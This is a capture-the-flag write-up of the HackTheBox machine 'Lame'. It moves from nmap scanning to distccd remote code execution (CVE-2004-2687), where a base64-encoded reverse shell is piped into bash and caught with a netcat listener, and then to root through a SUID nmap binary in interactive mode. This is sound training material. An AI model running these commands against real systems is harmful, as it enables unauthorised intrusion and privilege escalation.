---
description: Lame box from HackTheBox write up.
---

# Lame

## Nmap scan

As usual let's start with `nmap`:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -p- --min-rate 1000 -v
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 17:49 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.050s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 104.17 seconds
           Raw packets sent: 131147 (5.770MB) | Rcvd: 84 (3.680KB)
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -p21,22,139,445,3632 -sC -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 17:53 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.050s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.48
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m31s, deviation: 2h49m43s, median: 30s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-09-07T17:54:09-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.46 seconds
```

So we have SSH, FTP, Samba and `distccd`. That last service is used to send code to be compiled in another computer, I think we can start with it.

## Distccd

Let's check if it is vulnerable to CVE-2004-2687:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 3632 <MACHINE_IP> --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 18:00 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.052s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

In fact it is! We have RCE, that was fast. Next step is to get a shell.

### Reverse shell

I just `base64` encoded a Python reverse shell payload and used an [implementation of the vulnerability in Python](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855){:target="_blank"} to send it:

```bash
./CVE-2004-2687.py -t <MACHINE_IP> -p 3632 -c "echo <BASE64_REVSHELL> | base64 -d | bash"
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.48] from (UNKNOWN) [<MACHINE_IP>] 44031
sh: no job control in this shell
sh-3.2$
```

The user flag is under `/home/makis/user.txt`

## Privilege escalation

Once in the box we can start checking for escalation vectors. After some digging i found that the `nmap` binary has the SUID bit set and is owned by root:

```bash
daemon@lame:/$ find / -perm /4000 2> /dev/null
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
daemon@lame:/$ ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
```

To abuse this, we can simply execute `nmap --interactive` and then execute a system command. That system command will be executed as `root` so we can become `root` now:

```bash
daemon@lame:/tmp$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash -p
bash-3.2# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
bash-3.2# 
```

The root flag is under `/root/root.txt`.